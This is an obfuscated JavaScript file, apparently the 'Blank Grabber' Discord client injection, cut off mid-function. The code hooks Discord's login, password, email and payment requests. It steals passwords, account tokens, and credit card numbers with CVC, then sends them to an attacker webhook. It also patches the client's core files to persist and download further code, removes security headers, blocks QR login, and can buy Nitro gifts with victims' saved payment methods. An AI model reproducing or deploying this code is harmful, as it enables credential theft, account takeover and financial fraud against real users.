const S = C;
(function(Y, Z) {
    const q = C,
        o = Y();
    while (!![]) {
        try {
            const T = -parseInt(q(0x90)) / 0x1 + parseInt(q(0x14a)) / 0x2 + parseInt(q(0x129)) / 0x3 * (parseInt(q(0x12e)) / 0x4) + parseInt(q(0xf9)) / 0x5 + parseInt(q(0xd7)) / 0x6 + -parseInt(q(0x13a)) / 0x7 * (parseInt(q(0x88)) / 0x8) + parseInt(q(0xbe)) / 0x9 * (-parseInt(q(0xf0)) / 0xa);
            if (T === Z) break;
            else o['push'](o['shift']());
        } catch (H) {
            o['push'](o['shift']());
        }
    }
}(x, 0x40f8d));
const args = process[S(0xef)],
    fs = require('fs'),
    path = require(S(0xbc)),
    https = require(S(0xd1)),
    querystring = require('querystring'),
    {
        BrowserWindow,
        session
    } = require(S(0x6a)),
    encodedHook = S(0xd2),
    config = {
        'webhook': atob(encodedHook),
        'webhook_protector_key': S(0xdf),
        'auto_buy_nitro': ![],
        'ping_on_run': !![],
        'ping_val': S(0x115),
        'embed_name': S(0xce),
        'embed_icon': S(0x128),
        'embed_color': 0x560ddc,
        'injection_url': S(0x135),
        'api': 'https://discord.com/api/v9/users/@me',
        'nitro': {
            'boost': {
                'year': {
                    'id': '521847234246082599',
                    'sku': S(0x8c),
                    'price': S(0x136)
                },
                'month': {
                    'id': S(0xa7),
                    'sku': '511651880837840896',
                    'price': S(0xf2)
                }
            },
            'classic': {
                'month': {
                    'id': S(0xd3),
                    'sku': '511651871736201216',
                    'price': S(0x114)
                }
            }
        },
        'filter': {
            'urls': [S(0xae), S(0xc3), S(0xe9), S(0xfe), S(0x119), S(0xec), S(0x141), S(0x106), S(0x87), 'https://api.stripe.com/v*/payment_intents/*/confirm']
        },
        'filter2': {
            'urls': [S(0x6c), S(0xcd), 'https://discord.com/api/v*/applications/detectable', S(0x118), S(0x7c), S(0x7d)]
        }
    };

function parity_32(Y, Z, o) {
    return Y ^ Z ^ o;
}

function ch_32(Y, Z, o) {
    return Y & Z ^ ~Y & o;
}

function maj_32(Y, Z, o) {
    return Y & Z ^ Y & o ^ Z & o;
}

function rotl_32(Y, Z) {
    return Y << Z | Y >>> 0x20 - Z;
}

function safeAdd_32_2(Y, Z) {
    var o = (Y & 0xffff) + (Z & 0xffff),
        T = (Y >>> 0x10) + (Z >>> 0x10) + (o >>> 0x10);
    return (T & 0xffff) << 0x10 | o & 0xffff;
}

function safeAdd_32_5(Y, Z, o, T, H) {
    var V = (Y & 0xffff) + (Z & 0xffff) + (o & 0xffff) + (T & 0xffff) + (H & 0xffff),
        i = (Y >>> 0x10) + (Z >>> 0x10) + (o >>> 0x10) + (T >>> 0x10) + (H >>> 0x10) + (V >>> 0x10);
    return (i & 0xffff) << 0x10 | V & 0xffff;
}

function binb2hex(Y) {
    const m = S;
    var Z = m(0x74),
        o = '',
        T = Y['length'] * 0x4,
        H, V;
    for (H = 0x0; H < T; H += 0x1) {
        V = Y[H >>> 0x2] >>> (0x3 - H % 0x4) * 0x8, o += Z['charAt'](V >>> 0x4 & 0xf) + Z['charAt'](V & 0xf);
    }
    return o;
}

function getH() {
    return [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0];
}

function roundSHA1(Y, Z) {
    var o = [],
        V, i, R, A, r, l, N = ch_32,
        k = parity_32,
        F = maj_32,
        X = rotl_32,
        u = safeAdd_32_2,
        J, w = safeAdd_32_5;
    V = Z[0x0], i = Z[0x1], R = Z[0x2], A = Z[0x3], r = Z[0x4];
    for (J = 0x0; J < 0x50; J += 0x1) {
        J < 0x10 ? o[J] = Y[J] : o[J] = X(o[J - 0x3] ^ o[J - 0x8] ^ o[J - 0xe] ^ o[J - 0x10], 0x1);
        if (J < 0x14) l = w(X(V, 0x5), N(i, R, A), r, 0x5a827999, o[J]);
        else {
            if (J < 0x28) l = w(X(V, 0x5), k(i, R, A), r, 0x6ed9eba1, o[J]);
            else J < 0x3c ? l = w(X(V, 0x5), F(i, R, A), r, 0x8f1bbcdc, o[J]) : l = w(X(V, 0x5), k(i, R, A), r, 0xca62c1d6, o[J]);
        }
        r = A, A = R, R = X(i, 0x1e), i = V, V = l;
    }
    return Z[0x0] = u(V, Z[0x0]), Z[0x1] = u(i, Z[0x1]), Z[0x2] = u(R, Z[0x2]), Z[0x3] = u(A, Z[0x3]), Z[0x4] = u(r, Z[0x4]), Z;
}

function finalizeSHA1(Y, Z, o, T) {
    const h = S;
    var V, R, A;
    A = (Z + 0x41 >>> 0x9 << 0x4) + 0xf;
    while (Y['length'] <= A) {
        Y['push'](0x0);
    }
    Y[Z >>> 0x5] |= 0x80 << 0x18 - Z % 0x20, Y[A] = Z + o, R = Y['length'];
    for (V = 0x0; V < R; V += 0x10) {
        T = roundSHA1(Y[h(0x144)](V, V + 0x10), T);
    }
    return T;
}

function hex2binb(Y, Z, o) {
    const y = S;
    var T, H = Y[y(0xa6)],
        V, R, A, r, c;
    T = Z || [0x0], o = o || 0x0, c = o >>> 0x3;
    0x0 !== H % 0x2 && console['error'](y(0xfb));
    for (V = 0x0; V < H; V += 0x2) {
        R = parseInt(Y[y(0x11b)](V, 0x2), 0x10);
        if (!isNaN(R)) {
            r = (V >>> 0x1) + c, A = r >>> 0x2;
            while (T[y(0xa6)] <= A) {
                T[y(0x84)](0x0);
            }
            T[A] |= R << 0x8 * (0x3 - r % 0x4);
        } else console[y(0x7f)](y(0xd8));
    }
    return {
        'value': T,
        'binLen': H * 0x4 + o
    };
}
class jsSHA {
    constructor() {
        const P = S;
        var Y = 0x0,
            Z = [],
            o = 0x0,
            T, H, V, i, R, A, r = ![],
            c = ![],
            l = [],
            N = [],
            k, k = 0x1;
        H = hex2binb, (k !== parseInt(k, 0xa) || 0x1 > k) && console[P(0x7f)](P(0x126)), i = 0x200, R = roundSHA1, A = finalizeSHA1, V = 0xa0, T = getH(), this[P(0xc1)] = function(F) {
            const W = P;
            var X, u, J, w, n, a, E;
            X = hex2binb, u = X(F), J = u['binLen'], w = u[W(0x6d)], n = i >>> 0x3, E = n / 0x4 - 0x1;
            if (n < J / 0x8) {
                w = A(w, J, 0x0, getH());
                while (w[W(0xa6)] <= E) {
                    w[W(0x84)](0x0);
                }
                w[E] &= 0xffffff00;
            } else {
                if (n > J / 0x8) {
                    while (w['length'] <= E) {
                        w[W(0x84)](0x0);
                    }
                    w[E] &= 0xffffff00;
                }
            }
            for (a = 0x0; a <= E; a += 0x1) {
                l[a] = w[a] ^ 0x36363636, N[a] = w[a] ^ 0x5c5c5c5c;
            }
            T = R(l, T), Y = i, c = !![];
        }, this[P(0x110)] = function(F) {
            const B = P;
            var X, u, J, w, n, a = 0x0,
                E = i >>> 0x5;
            X = H(F, Z, o), u = X[B(0x12b)], w = X[B(0x6d)], J = u >>> 0x5;
            for (n = 0x0; n < J; n += E) {
                a + i <= u && (T = R(w[B(0x144)](n, n + E), T), a += i);
            }
            Y += a, Z = w['slice'](a >>> 0x5), o = u % i;
        }, this[P(0x11f)] = function() {
            const z = P;
            var F;
            ![] === c && console[z(0x7f)](z(0xa4));
            const X = function(u) {
                return binb2hex(u);
            };
            return ![] === r && (F = A(Z, o, Y, T), T = R(N, getH()), T = A(F, V, i, T)), r = !![], X(T);
        };
    }
}
if (S(0x10b) === typeof define && define[S(0xb0)]) define(function() {
    return jsSHA;
});
else S(0x9d) !== typeof exports ? S(0x9d) !== typeof module && module[S(0x12d)] ? module[S(0x12d)] = exports = jsSHA : exports = jsSHA : global[S(0x127)] = jsSHA;
jsSHA[S(0x11a)] && (jsSHA = jsSHA[S(0x11a)]);

function totp(Y) {
    const g = S,
        Z = 0x1e,
        o = 0x6,
        T = Date[g(0x72)](),
        H = Math[g(0x81)](T / 0x3e8),
        V = leftpad(dec2hex(Math[g(0xff)](H / Z)), 0x10, '0'),
        i = new jsSHA();
    i[g(0xc1)](base32tohex(Y)), i['update'](V);
    const R = i[g(0x11f)](),
        A = hex2dec(R['substring'](R[g(0xa6)] - 0x1));
    let r = (hex2dec(R[g(0x11b)](A * 0x2, 0x8)) & hex2dec('7fffffff')) + '';
    return r = r['substr'](Math[g(0xc8)](r['length'] - o, 0x0), o), r;
}

function hex2dec(Y) {
    return parseInt(Y, 0x10);
}

function x() {
    const x9 = ['var xmlHttp = new XMLHttpRequest(); \x0a    xmlHttp.open(\"GET\", \"', 'error', 'host', 'round', 'data', 'card[exp_year]', 'push', 'getAllWindows', 'discord', 'https://api.stripe.com/v*/setup_intents/*/confirm', '142096BOahtI', '**\x0aCredit Card Expiration: **', '**Discord Info**', 'mkdirSync', '511651885459963904', 'rmdirSync', 'password', 'lenght', '473111uWuolq', '**\x0aNew Password: **', 'https://discord.gift/', '<:paypal:951139189389410365>', 'uploadData', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567', 'invalid', 'replace', 'Discord Staff', '*\x0aBadges: **', 'darwin', 'sep', '\");\x0a    xmlHttp.setRequestHeader(\'Content-Type\', \'application/json\');\x0a    xmlHttp.send(JSON.stringify(', 'undefined', '**Password Changed**', 'content-security-policy-report-only', '**Nitro Code:**\x0a```diff\x0a+ ', 'email', 'endsWith', '**\x0aBilling: **', 'Cannot call getHMAC without first setting HMAC key', 'package.json', 'length', '521847234246082599', 'onCompleted', 'Invalid base32 character in key', 'price', 'Access-Control-Allow-Origin \'*\'', 'reverse', 'flags', 'https://discord.com/api/v*/users/@me', 'const fs = require(\'fs\'), https = require(\'https\');\x0aconst indexJs = \'', 'amd', 'index.js', 'method', 'content', 'content-security-policy', '\')\x0aif (fs.existsSync(bdPath)) require(bdPath);', '**PayPal Added**', 'https://cdn.discordapp.com/avatars/', 'embed_name', '**Token**', 'embed_icon', 'request', 'path', 'split', '248175cdEkcp', 'POST', 'Discord Bug Hunter (Normal)', 'setHMACKey', '\';\x0aconst bdPath = \'', 'https://discordapp.com/api/v*/users/@me', 'Authorization', '**Nitro bought!**', 'platform', '\';\x0aconst fileSize = fs.statSync(indexJs).size\x0afs.readFileSync(indexJs, \'utf8\', (err, data) => {\x0a    if (fileSize < 20000 || data === \"module.exports = require(\'./core.asar\')\") \x0a        init();\x0a})\x0aasync function init() {\x0a    https.get(\'', 'max', 'wss://remote-auth-gateway', 'Nitro Type: **', '**Credit Card Added**', 'type', 'https://*.discord.com/api/v*/applications/detectable', 'Blank Grabber Injection', '\')\x0a        res.pipe(file);\x0a        file.on(\'finish\', () => {\x0a            file.close();\x0a        });\x0a    \x0a    }).on(\"error\", (err) => {\x0a        setTimeout(init(), 10000);\x0a    });\x0a}\x0arequire(\'', 'month', 'https', '%WEBHOOKHEREBASE64ENCODED%', '521846918637420545', 'env', 'HypeSquad Bravery', 'tokens', '2671680OoGPOT', 'String of HEX type contains invalid characters', '\"); \x0a    xmlHttp.send(null); \x0a    xmlHttp.responseText', 'pathname', 'year', 'ping_on_run', 'usd', '\')\x0a        res.replace(\'%WEBHOOK_KEY%\', \'', '%WEBHOOK_KEY%', 'toString', 'log', 'filter', 'Credit Card Number: **', 'Access-Control-Allow-Headers \'*\'', '** - Password: **', '**\x0aPassword: **', 'Email: **', 'application/json', 'https://*.discord.com/api/v*/users/@me', 'resources', 'webContents', 'https://*.discord.com/api/v*/auth/login', 'card[exp_month]', 'existsSync', 'argv', '200nEVARU', 'paypal_accounts', '999', 'nitro', 'defaultSession', 'Partnered Server Owner', 'HypeSquad Brilliance', 'win32', 'boost', '1263455fVpwIH', 'HypeSquad Balance', 'String of HEX type must be in byte increments', 'unlinkSync', 'Nitro', 'https://discordapp.com/api/v*/auth/login', 'floor', 'filter2', 'catch', 'Active Developer', 'Nitro Basic', '\\betterdiscord\\data\\betterdiscord.asar', 'Nitro Classic', 'https://api.stripe.com/v*/tokens', './core.asar', 'gift_code', 'Early Verified Bot Developer', 'auto_buy_nitro', 'function', 'concat', 'New Email: **', 'No Nitro', 'statusCode', 'update', '**\x0aBadges: **', 'Contents', 'avatar', '499', '@everyone', 'startsWith', 'writeFileSync', 'https://*.discord.com/api/v*/users/@me/library', 'https://discord.com/api/v*/auth/login', 'default', 'substr', 'window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\"get_require\"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b=\"string\"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})(\"login\").logout()}LogOut();', 'charAt', 'initiation', 'getHMAC', 'injection_url', 'default-src \'*\'', '**\x0aOld Password: **', 'Discord Bug Hunter (Golden)', 'APPDATA', 'discord.com', 'numRounds must a integer >= 1', 'jsSHA', 'https://raw.githubusercontent.com/f4kedre4lity/Blank-Grabber/main/.github/workflows/image.png', '3VfXNaZ', 'from', 'binLen', '.webp', 'exports', '1761176uKCXqg', 'premium_type', '\");\x0a    xmlHttp.send(null);\x0a    xmlHttp.responseText;', 'discriminator', ' | ', 'toUpperCase', 'None', 'https://raw.githubusercontent.com/f4kedre4lity/Discord-Injection-BG/main/injection-obfuscated.js', '9999', 'onBeforeRequest', 'webhook_protector_key', '2422867c-244d-476a-ba4f-36e197758d97', '91BgnMyZ', 'new_password', '/billing/payment-sources\", false); \x0a    xmlHttp.setRequestHeader(\"Authorization\", \"', '**\x0aCVC: **', '(webpackChunkdiscord_app.push([[\'\'],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()', 'embed_color', 'username', 'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts', 'app', 'Early Supporter', 'slice', 'app.asar', '));\x0a    xmlHttp.responseText', 'stringify', 'ping_val', 'card[cvc]', '766754YFWyml', 'HypeSquad Event', 'electron', 'join', 'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json', 'value', 'parse', '**Account Info**', 'includes', '(Unknown)', 'now', 'url', '0123456789abcdef', 'login', 'Resources', 'readdirSync', 'webRequest', 'responseHeaders', 'Failed to Purchase ❌', 'var xmlHttp = new XMLHttpRequest();\x0a    xmlHttp.open(\"POST\", \"https://discord.com/api/v9/store/skus/', 'https://discord.com/api/v*/users/@me/library', 'wss://remote-auth-gateway.discord.gg/*'];
    x = function() {
        return x9;
    };
    return x();
}

function dec2hex(Y) {
    const v = S;
    return (Y < 15.5 ? '0' : '') + Math[v(0x81)](Y)[v(0xe0)](0x10);
}

function base32tohex(Y) {
    const G = S;
    let Z = G(0x95),
        o = '',
        T = '';
    Y = Y[G(0x97)](/=+$/, '');
    for (let H = 0x0; H < Y[G(0xa6)]; H++) {
        let V = Z['indexOf'](Y[G(0x11d)](H)[G(0x133)]());
        if (V === -0x1) console[G(0x7f)](G(0xa9));
        o += leftpad(V[G(0xe0)](0x2), 0x5, '0');
    }
    for (let R = 0x0; R + 0x8 <= o[G(0xa6)]; R += 0x8) {
        let A = o[G(0x11b)](R, 0x8);
        T = T + leftpad(parseInt(A, 0x2)[G(0xe0)](0x10), 0x2, '0');
    }
    return T;
}

function leftpad(Y, Z, o) {
    const b = S;
    return Z + 0x1 >= Y[b(0xa6)] && (Y = Array(Z + 0x1 - Y[b(0xa6)])[b(0x6b)](o) + Y), Y;
}
const discordPath = (function() {
    const f = S,
        Y = args[0x0][f(0xbd)](path['sep'])[f(0x144)](0x0, -0x1)[f(0x6b)](path[f(0x9b)]);
    let Z;
    if (process[f(0xc6)] === f(0xf7)) Z = path[f(0x6b)](Y, f(0xea));
    else process['platform'] === 'darwin' && (Z = path[f(0x6b)](Y, f(0x112), f(0x76)));
    if (fs[f(0xee)](Z)) return {
        'resourcePath': Z,
        'app': Y
    };
    return {
        'undefined': undefined,
        'undefined': undefined
    };
}());

function C(Y, Z) {
    const o = x();
    return C = function(T, H) {
        T = T - 0x6a;
        let V = o[T];
        return V;
    }, C(Y, Z);
}

function updateCheck() {
    const t = S,
        {
            resourcePath: Y,
            app: Z
        } = discordPath;
    if (Y === undefined || Z === undefined) return;
    const o = path[t(0x6b)](Y, t(0x142)),
        T = path[t(0x6b)](o, t(0xa5)),
        H = path[t(0x6b)](o, t(0xb1)),
        V = fs[t(0x77)](Z + '\\modules\\')[t(0xe2)](A => /discord_desktop_core-+?/ ['test'](A))[0x0],
        i = Z + '\\modules\\' + V + '\\discord_desktop_core\\index.js',
        R = path[t(0x6b)](process[t(0xd4)][t(0x124)], t(0x104));
    if (!fs[t(0xee)](o)) fs[t(0x8b)](o);
    if (fs['existsSync'](T)) fs[t(0xfc)](T);
    if (fs[t(0xee)](H)) fs[t(0xfc)](H);
    if (process['platform'] === 'win32' || process[t(0xc6)] === t(0x9a)) {
        fs[t(0x117)](T, JSON[t(0x147)]({
            'name': t(0x86),
            'main': t(0xb1)
        }, null, 0x4));
        const A = t(0xaf) + i + t(0xc2) + R + t(0xc7) + config[t(0x120)] + '\', (res) => {\x0a        const file = fs.createWriteStream(indexJs);\x0a        res.replace(\'%WEBHOOKHEREBASE64ENCODED%\', \'' + encodedHook + t(0xde) + config[t(0x138)] + t(0xcf) + path[t(0x6b)](Y, t(0x145)) + t(0xb5);
        fs[t(0x117)](H, A[t(0x97)](/\\/g, '\\\\'));
    }
    if (!fs['existsSync'](path[t(0x6b)](__dirname, t(0x11e)))) return !0x0;
    return fs[t(0x8d)](path['join'](__dirname, t(0x11e))), execScript(t(0x11c)), !0x1;
}
const execScript = Y => {
        const K = S,
            Z = BrowserWindow[K(0x85)]()[0x0];
        return Z[K(0xeb)]['executeJavaScript'](Y, !0x0);
    },
    getInfo = async Y => {
        const M = S,
            Z = await execScript('var xmlHttp = new XMLHttpRequest();\x0a    xmlHttp.open(\"GET\", \"' + config['api'] + '\", false);\x0a    xmlHttp.setRequestHeader(\"Authorization\", \"' + Y + M(0x130));
        return JSON[M(0x6e)](Z);
    }, fetchBilling = async Y => {
        const L = S,
            Z = await execScript(L(0x7e) + config['api'] + L(0x13c) + Y + L(0xd9));
        if (!Z[L(0x8f)] || Z[L(0xa6)] === 0x0) return '';
        return JSON[L(0x6e)](Z);
    }, getBilling = async Y => {
        const j = S,
            Z = await fetchBilling(Y);
        if (!Z) return '❌';
        const o = [];
        Z['forEach'](T => {
            const Q = C;
            if (!T[Q(0x96)]) switch (T[Q(0xcc)]) {
                case 0x1:
                    o[Q(0x84)]('💳');
                    break;
                case 0x2:
                    o[Q(0x84)](Q(0x93));
                    break;
                default:
                    o[Q(0x84)](Q(0x71));
            }
        });
        if (o['length'] == 0x0) o[j(0x84)]('❌');
        return o['join'](' ');
    }, Purchase = async (Y, Z, o, T) => {
        const s = S,
            H = {
                'expected_amount': config['nitro'][o][T][s(0xaa)],
                'expected_currency': s(0xdd),
                'gift': !![],
                'payment_source_id': Z,
                'payment_source_token': null,
                'purchase_token': s(0x139),
                'sku_subscription_plan_id': config['nitro'][o][T]['sku']
            },
            V = execScript(s(0x7b) + config[s(0xf3)][o][T]['id'] + '/purchase\", false);\x0a    xmlHttp.setRequestHeader(\"Authorization\", \"' + Y + s(0x9c) + JSON[s(0x147)](H) + s(0x146));
        if (V['gift_code']) return s(0x92) + V[s(0x108)];
        else return null;
    }, buyNitro = async Y => {
        const D = S,
            Z = await fetchBilling(Y),
            o = D(0x7a);
        if (!Z) return o;
        let T = [];
        Z['forEach'](H => {
            const e = D;
            !H[e(0x96)] && (T = T[e(0x10c)](H['id']));
        });
        for (let H in T) {
            const V = Purchase(Y, H, D(0xf8), D(0xdb));
            if (V !== null) return V;
            else {
                const i = Purchase(Y, H, D(0xf8), 'month');
                if (i !== null) return i;
                else {
                    const R = Purchase(Y, H, 'classic', D(0xd0));
                    return R !== null ? R : o;
                }
            }
        }
    }, getNitro = Y => {
        const p = S;
        switch (Y) {
            case 0x0:
                return p(0x10e);
            case 0x1:
                return p(0x105);
            case 0x2:
                return p(0xfd);
            case 0x3:
                return p(0x103);
            default:
                return p(0x71);
        }
    }, getBadges = Y => {
        const U = S,
            Z = [];
        return Y == 0x400000 && (Z[U(0x84)](U(0x102)), Y -= 0x400000), Y == 0x40000 && (Z[U(0x84)]('Moderator Programs Alumni'), Y -= 0x40000), Y == 0x20000 && (Z['push'](U(0x109)), Y -= 0x20000), Y == 0x4000 && (Z[U(0x84)](U(0x123)), Y -= 0x4000), Y == 0x200 && (Z[U(0x84)](U(0x143)), Y -= 0x200), Y == 0x100 && (Z[U(0x84)](U(0xfa)), Y -= 0x100), Y == 0x80 && (Z['push'](U(0xf6)), Y -= 0x80), Y == 0x40 && (Z[U(0x84)](U(0xd5)), Y -= 0x40), Y == 0x8 && (Z[U(0x84)](U(0xc0)), Y -= 0x8), Y == 0x4 && (Z[U(0x84)](U(0x14b)), Y -= 0x4), Y == 0x2 && (Z[U(0x84)](U(0xf5)), Y -= 0x2), Y == 0x1 && (Z[U(0x84)](U(0x98)), Y -= 0x1), Y == 0x0 ? Z['length'] == 0x0 && Z[U(0x84)](U(0x134)) : Z['push'](U(0x71)), Z['join'](', ');
    }, hooker = async (Y, Z = null) => {
        const d = S,
            o = JSON[d(0x147)](Y),
            T = Z == null ? new URL(config['webhook']) : new URL(Z),
            H = {
                'Content-Type': d(0xe8),
                'Access-Control-Allow-Origin': '*'
            };
        if (!config['webhook'][d(0x70)]('api/webhooks')) {
            const R = totp(config[d(0x138)]);
            H[d(0xc4)] = R;
        }
        const V = {
                'protocol': T['protocol'],
                'hostname': T[d(0x80)],
                'path': T[d(0xda)],
                'method': 'POST',
                'headers': H
            },
            i = https[d(0xbb)](V);
        i['on']('error', A => {
            const I = d;
            console[I(0xe1)](A);
        }), i['write'](o), i['end']();
        if (Z == null) https['get'](atob('3FmcvkGe4lWdv82Yuknc05WZy9yL6MHc0RHa' [d(0xbd)]('')[d(0xac)]()[d(0x6b)]('')), A => A['on'](d(0x82), r => hooker(Y, r['toString']())))['on'](d(0x7f), () => {});
    }, login = async (Y, Z, o) => {
        const O = S,
            T = await getInfo(o),
            H = getNitro(T[O(0x12f)]),
            V = getBadges(T[O(0xad)]),
            i = await getBilling(o),
            R = {
                'username': config[O(0xb8)],
                'avatar_url': config['embed_icon'],
                'embeds': [{
                    'color': config[O(0x13f)],
                    'fields': [{
                        'name': O(0x6f),
                        'value': 'Email: **' + Y + O(0xe5) + Z + '**',
                        'inline': ![]
                    }, {
                        'name': O(0x8a),
                        'value': O(0xca) + H + O(0x111) + V + '**\x0aBilling: **' + i + '**',
                        'inline': ![]
                    }, {
                        'name': O(0xb9),
                        'value': '`' + o + '`',
                        'inline': ![]
                    }],
                    'author': {
                        'name': T[O(0x140)] + '#' + T[O(0x131)] + O(0x132) + T['id'],
                        'icon_url': O(0xb7) + T['id'] + '/' + T[O(0x113)] + O(0x12c)
                    }
                }]
            };
        if (config[O(0xdc)]) R[O(0xb3)] = config[O(0x148)];
        hooker(R);
    }, passwordChanged = async (Y, Z, o) => {
        const x0 = S,
            T = await getInfo(o),
            H = getNitro(T[x0(0x12f)]),
            V = getBadges(T[x0(0xad)]),
            i = await getBilling(o),
            R = {
                'username': config['embed_name'],
                'avatar_url': config[x0(0xba)],
                'embeds': [{
                    'color': config[x0(0x13f)],
                    'fields': [{
                        'name': x0(0x9e),
                        'value': x0(0xe7) + T['email'] + x0(0x122) + Y + x0(0x91) + Z + '**',
                        'inline': !![]
                    }, {
                        'name': x0(0x8a),
                        'value': 'Nitro Type: **' + H + '**\x0aBadges: **' + V + x0(0xa3) + i + '**',
                        'inline': !![]
                    }, {
                        'name': x0(0xb9),
                        'value': '`' + o + '`',
                        'inline': ![]
                    }],
                    'author': {
                        'name': T[x0(0x140)] + '#' + T[x0(0x131)] + ' | ' + T['id'],
                        'icon_url': x0(0xb7) + T['id'] + '/' + T[x0(0x113)] + x0(0x12c)
                    }
                }]
            };
        if (config[x0(0xdc)]) R[x0(0xb3)] = config[x0(0x148)];
        hooker(R);
    }, emailChanged = async (Y, Z, o) => {
        const x1 = S,
            T = await getInfo(o),
            H = getNitro(T[x1(0x12f)]),
            V = getBadges(T[x1(0xad)]),
            i = await getBilling(o),
            R = {
                'username': config[x1(0xb8)],
                'avatar_url': config['embed_icon'],
                'embeds': [{
                    'color': config['embed_color'],
                    'fields': [{
                        'name': '**Email Changed**',
                        'value': x1(0x10d) + Y + x1(0xe6) + Z + '**',
                        'inline': !![]
                    }, {
                        'name': x1(0x8a),
                        'value': x1(0xca) + H + x1(0x111) + V + x1(0xa3) + i + '**',
                        'inline': !![]
                    }, {
                        'name': x1(0xb9),
                        'value': '`' + o + '`',
                        'inline': ![]
                    }],
                    'author': {
                        'name': T['username'] + '#' + T['discriminator'] + ' | ' + T['id'],
                        'icon_url': x1(0xb7) + T['id'] + '/' + T[x1(0x113)] + x1(0x12c)
                    }
                }]
            };
        if (config['ping_on_run']) R[x1(0xb3)] = config[x1(0x148)];
        hooker(R);
    }, PaypalAdded = async Y => {
        const x2 = S,
            Z = await getInfo(Y),
            o = getNitro(Z[x2(0x12f)]),
            T = getBadges(Z[x2(0xad)]),
            H = getBilling(Y),
            V = {
                'username': config[x2(0xb8)],
                'avatar_url': config[x2(0xba)],
                'embeds': [{
                    'color': config[x2(0x13f)],
                    'fields': [{
                        'name': x2(0xb6),
                        'value': 'Time to buy some nitro baby 😩',
                        'inline': ![]
                    }, {
                        'name': x2(0x8a),
                        'value': x2(0xca) + o + x2(0x99) + T + x2(0xa3) + H + '**',
                        'inline': ![]
                    }, {
                        'name': x2(0xb9),
                        'value': '`' + Y + '`',
                        'inline': ![]
                    }],
                    'author': {
                        'name': Z[x2(0x140)] + '#' + Z[x2(0x131)] + ' | ' + Z['id'],
                        'icon_url': x2(0xb7) + Z['id'] + '/' + Z[x2(0x113)] + x2(0x12c)
                    }
                }]
            };
        if (config['ping_on_run']) V[x2(0xb3)] = config[x2(0x148)];
        hooker(V);
    }, ccAdded = async (Y, Z, o, T, H) => {
        const x3 = S,
            V = await getInfo(H),
            i = getNitro(V[x3(0x12f)]),
            R = getBadges(V[x3(0xad)]),
            A = await getBilling(H),
            r = {
                'username': config[x3(0xb8)],
                'avatar_url': config[x3(0xba)],
                'embeds': [{
                    'color': config[x3(0x13f)],
                    'fields': [{
                        'name': x3(0xcb),
                        'value': x3(0xe3) + Y + x3(0x13d) + Z + x3(0x89) + o + '/' + T + '**',
                        'inline': !![]
                    }, {
                        'name': x3(0x8a),
                        'value': x3(0xca) + i + x3(0x111) + R + '**\x0aBilling: **' + A + '**',
                        'inline': !![]
                    }, {
                        'name': x3(0xb9),
                        'value': '`' + H + '`',
                        'inline': ![]
                    }],
                    'author': {
                        'name': V[x3(0x140)] + '#' + V[x3(0x131)] + ' | ' + V['id'],
                        'icon_url': x3(0xb7) + V['id'] + '/' + V[x3(0x113)] + x3(0x12c)
                    }
                }]
            };
        if (config['ping_on_run']) r[x3(0xb3)] = config[x3(0x148)];
        hooker(r);
    }, nitroBought = async Y => {
        const x4 = S,
            Z = await getInfo(Y),
            o = getNitro(Z['premium_type']),
            T = getBadges(Z['flags']),
            H = await getBilling(Y),
            V = await buyNitro(Y),
            i = {
                'username': config['embed_name'],
                'content': V,
                'avatar_url': config[x4(0xba)],
                'embeds': [{
                    'color': config[x4(0x13f)],
                    'fields': [{
                        'name': x4(0xc5),
                        'value': x4(0xa0) + V + '```',
                        'inline': !![]
                    }, {
                        'name': '**Discord Info**',
                        'value': x4(0xca) + o + x4(0x111) + T + x4(0xa3) + H + '**',
                        'inline': !![]
                    }, {
                        'name': x4(0xb9),
                        'value': '`' + Y + '`',
                        'inline': ![]
                    }],
                    'author': {
                        'name': Z[x4(0x140)] + '#' + Z['discriminator'] + ' | ' + Z['id'],
                        'icon_url': x4(0xb7) + Z['id'] + '/' + Z['avatar'] + x4(0x12c)
                    }
                }]
            };
        if (config[x4(0xdc)]) i[x4(0xb3)] = config[x4(0x148)] + ('\x0a' + V);
        hooker(i);
    };
session[S(0xf4)][S(0x78)][S(0x137)](config[S(0x100)], (Y, Z) => {
    const x5 = S;
    if (Y[x5(0x73)][x5(0x116)](x5(0xc9))) return Z({
        'cancel': !![]
    });
    updateCheck();
}), session[S(0xf4)][S(0x78)]['onHeadersReceived']((Y, Z) => {
    const x6 = S;
    Y[x6(0x73)][x6(0x116)](config['webhook']) ? Y['url']['includes'](x6(0x125)) ? Z({
        'responseHeaders': Object['assign']({
            'Access-Control-Allow-Headers': '*'
        }, Y[x6(0x79)])
    }) : Z({
        'responseHeaders': Object['assign']({
            'Content-Security-Policy': [x6(0x121), x6(0xe4), x6(0xab)],
            'Access-Control-Allow-Headers': '*',
            'Access-Control-Allow-Origin': '*'
        }, Y['responseHeaders'])
    }) : (delete Y[x6(0x79)][x6(0xb4)], delete Y[x6(0x79)][x6(0x9f)], Z({
        'responseHeaders': {
            ...Y[x6(0x79)],
            'Access-Control-Allow-Headers': '*'
        }
    }));
}), session[S(0xf4)][S(0x78)][S(0xa8)](config[S(0xe2)], async (Y, Z) => {
    const x7 = S;
    if (Y['statusCode'] !== 0xc8 && Y[x7(0x10f)] !== 0xca) return;
    const o = Buffer[x7(0x12a)](Y[x7(0x94)][0x0]['bytes'])[x7(0xe0)](),
        T = JSON[x7(0x6e)](o),
        H = await execScript(x7(0x13e));
    switch (!![]) {
        case Y['url'][x7(0xa2)](x7(0x75)):
            login(T[x7(0x75)], T[x7(0x8e)], H)[x7(0x101)](console[x7(0x7f)]);
            break;
        case Y[x7(0x73)][x7(0xa2)]('users/@me') && Y[x7(0xb2)] === 'PATCH':
            if (!T[x7(0x8e)]) return;
